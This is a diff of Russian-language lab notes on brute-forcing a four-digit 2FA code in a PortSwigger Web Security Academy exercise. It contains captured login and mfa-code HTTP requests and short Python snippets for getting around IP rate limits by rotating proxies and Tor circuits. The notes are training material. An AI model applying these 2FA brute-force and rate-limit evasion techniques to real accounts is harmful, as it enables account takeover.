@@ -1,4 +1,4 @@
-эксперт
+лаба эксперт
 
 есть валидные лог+пар
 и есть лог жертвы
@@ -7,7 +7,7 @@
 код который 2FA высылался - этот код нельзя было больше 1 раза ввести иначе вылетала страница
 чтобы получить новый код нужно было заного залогиниться и только потом вводить код!
 
-
+------
 
 <img src="../../assets/Снимок-10.47.27.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
@@ -29,7 +29,10 @@
 
 1) переходим по ссылке [My account](https://0a8c00f604be70e8816d573f008d0028.web-security-academy.net/my-account) 
 
-приходит такой ответ GET /login HTTP/2
+приходит такой ответ 
+
+```html
+GET /login HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=dlvN0oYdyOp38hnzgEAu1HInqMS3EgUA
 Accept-Language: ru-RU,ru;q=0.9
@@ -46,11 +49,14 @@ Sec-Ch-Ua-Platform: "macOS"
 Referer: https://0a8c00f604be70e8816d573f008d0028.web-security-academy.net/
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
+```
 
 
 где  в страницу вшит  токен например - lrYRbcjpwCdCApiYbbrPkdlLfQ63kRdp
 
-```HTTP/2 200 OK
+```html
+
+HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 X-Frame-Options: SAMEORIGIN
 Content-Length: 3164
@@ -123,6 +129,7 @@ Content-Length: 3164
 
 получив этот токен - мы берем его и подставляем в такой запрос
 
+```http
 POST /login HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=dlvN0oYdyOp38hnzgEAu1HInqMS3EgUA
@@ -146,11 +153,15 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=lrYRbcjpwCdCApiYbbrPkdlLfQ63kRdp&username=carlos&password=montoya
+```
 
 и выполняем вход в аккаунт
 
 
-приходит ответ GET /login2 HTTP/2
+приходит ответ 
+
+```http
+GET /login2 HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=p6QNtGgpWwl5UkseLsl3qiWGwG1aOKO5
 Cache-Control: max-age=0
@@ -168,10 +179,11 @@ Sec-Ch-Ua-Platform: "macOS"
 Referer: https://0a8c00f604be70e8816d573f008d0028.web-security-academy.net/login
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
-
+```
 где в коде снова вшит токен напрмиер: GUYeMya5NhGSCIkUxMJ5yYDoWRfpMPDk
 
-```HTTP/2 200 OK
+```html
+HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 X-Frame-Options: SAMEORIGIN
 Content-Length: 3005
@@ -243,6 +255,7 @@ Content-Length: 3005
 
 и отправляем запрос введя четрырех значный код
 
+```http
 POST /login2 HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=p6QNtGgpWwl5UkseLsl3qiWGwG1aOKO5
@@ -266,6 +279,7 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=GUYeMya5NhGSCIkUxMJ5yYDoWRfpMPDk&mfa-code=1231
+```
 
 
 
@@ -281,6 +295,7 @@ csrf=GUYeMya5NhGSCIkUxMJ5yYDoWRfpMPDk&mfa-code=1231
 
 и думаю , что  нужно вот именно этот запрос постоянно отправлять просто меняя в нем значение csrf=%ss и значение кода mfa-code=%s чтобы не отправлялся каждый раз новый проверочный код, мы просто будем подставлять в данный запрос валидный токен и следующий проверочный код
 
+```http
 POST /login2 HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=p6QNtGgpWwl5UkseLsl3qiWGwG1aOKO5
@@ -304,22 +319,22 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=GUYeMya5NhGSCIkUxMJ5yYDoWRfpMPDk&mfa-code=1231
+```
 
 
 -------
 
 далее ответы я проанализирую сам 
 
-
-
 либо:
 ------
-это нужно три бызы сделать ? 
+это нужно три фазы сделать ? 
 сперва обновлять страницу 10тыс раз и получить 10 тыс токенов
 
 потом 10тыс раз инициаровть вход в учетную запись карлоса и получить еще 10 тыс токенов
 
 и потом уже использовать это крайние 10 тыс токенов для попыток подбора ключа?
+бред
 
 _-------_
 
@@ -329,13 +344,13 @@ _-------_
 🟢🟢🟢🟢⭐️😁😁
 # пошагово попробую это решить:
 
-первое: получит ьавтоматически токен для логина
+первое: получить автоматически токен для логина
 
 первое действие - переход по ссылке:
-https://0a8c00f604be70e8816d573f008d0028.web-security-academy.net/my-account
+`https://0a8c00f604be70e8816d573f008d0028.web-security-academy.net/my-account`
 
 просмотр содержимого стр и извлечь от туда из строки значение value
- ```
+ ```http
  input required type="hidden" name="csrf" value="D77T9cE3PNc6tojoc10t7rCw8Qn5IRvH"
  ```
 
@@ -343,6 +358,7 @@ https://0a8c00f604be70e8816d573f008d0028.web-security-academy.net/my-account
 второе действие
 нужно отправить запрос
 
+```http
 POST /login HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=qwbkeqcjC4yfGHVRHYf69GFGVtz7LaKX
@@ -366,12 +382,14 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=D77T9cE3PNc6tojoc10t7rCw8Qn5IRvH&username=carlos&password=montoya
+```
 
 
 ---------
 прийдет ответ где в даных прийдет новый токен zt1oyueIocI48qUUK2V9B7F0gcm5qTu2
 
-```HTTP/2 200 OK
+```http
+HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 X-Frame-Options: SAMEORIGIN
 Content-Length: 3005
@@ -448,6 +466,7 @@ Content-Length: 3005
 
 
 
+```http
 POST /login2 HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=8ZxfRQvgrG0UkAKtO5nPguUG508ft8uA
@@ -471,7 +490,7 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=zt1oyueIocI48qUUK2V9B7F0gcm5qTu2&mfa-code=1234
-
+```
 
 ---------------
 
@@ -481,6 +500,7 @@ TjePg341GEkPO8poLvecOR0rcOM2erFY
 пробуем 
 
 
+```http
 POST /login2 HTTP/2
 Host: 0a8c00f604be70e8816d573f008d0028.web-security-academy.net
 Cookie: session=8ZxfRQvgrG0UkAKtO5nPguUG508ft8uA
@@ -504,7 +524,7 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
 csrf=TjePg341GEkPO8poLvecOR0rcOM2erFY&mfa-code=1334
-
+```
 - не сработало - скорее всего потому что сессию тоже нужно подменить
 -
 --------
@@ -543,11 +563,12 @@ L43xpyAsRZAAccztM15Gedu7RBFQp8f2
 # ГПТ мне обьяснил! оказывается! очень часто, при очередном входе - система не отправляет каждый раз новый код 2FA ! у этого кода свой срок жизни - напрмиер 10 минут! и за эти 10 минут я должен перебрать все варианты - попробовав угадать его! и даже запустить снова проверку чтобы снова угадать ))
 
 это мой рабочий скрипт который смог найти подобрать код!
-==пробую настроить скрипт для этого цикла==
 
+скрипт в конце файла , здесь ниже 
 
-
+-----
 #  🟣суть и выводы!
+
 код который 2FA высылался - этот код нельзя было больше 1 раза ввести иначе вылетала страница
 чтобы получить новый код нужно было заного залогиниться и только потом вводить код!
 
@@ -568,32 +589,35 @@ L43xpyAsRZAAccztM15Gedu7RBFQp8f2
 
 ### Способ A: Прокси-серверы (самый популярный)
 # Пример: Использование списка прокси
+```c
 proxies = [
     "http://proxy1.com:8080",
     "http://proxy2.com:8080", 
     # ... 500+ прокси
 ]
+```
 
 # Каждый запрос через случайный прокси
+```c
 for i in range(1000):
     proxy = random.choice(proxies)
     requests.get(url, proxies={"http": proxy, "https": proxy})
-
+```
 ----------------
 
 ### Способ B: Tor сеть
 
-python
-
+```c
 import requests
 from torpy import TorClient
-
+```
 # Каждый запрос через новый Tor цепь (новый IP)
+```c
 with TorClient() as tor:
     for i in range(1000):
         with tor.create_http_session() as session:
             response = session.get(url)  # Каждый раз новый IP
-
+```
 ----------------
 
 ### Способ C: Облачные сервисы (AWS, Google Cloud)
@@ -1285,5 +1309,3 @@ if __name__ == "__main__":
     main()
 ```
 
-
-# УСТРАНЕНИЕ ПРОБЛЕМЫ
